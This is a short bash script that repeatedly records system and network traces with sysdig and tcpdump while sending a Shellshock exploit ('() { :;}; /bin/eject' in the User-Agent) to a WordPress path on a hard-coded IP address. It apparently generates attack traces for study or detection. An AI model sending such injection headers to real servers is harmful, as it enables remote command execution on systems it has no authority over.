#!/bin/bash


for i in {0..200}
do
sudo nohup sysdig -w stream-$i.scap -z -s 4096 &

sudo nohup tcpdump -i eth0 -s0 -w stream-$i.cap port not 22 and port not 3490 and port not 3492 and port not 3790 and port not 80 >pdump.out &

sleep 4
curl -k -A "() { :;}; /bin/eject" https://54.218.47.176/wordpress/
sleep 4
sudo pkill -P $$
sleep 4
done

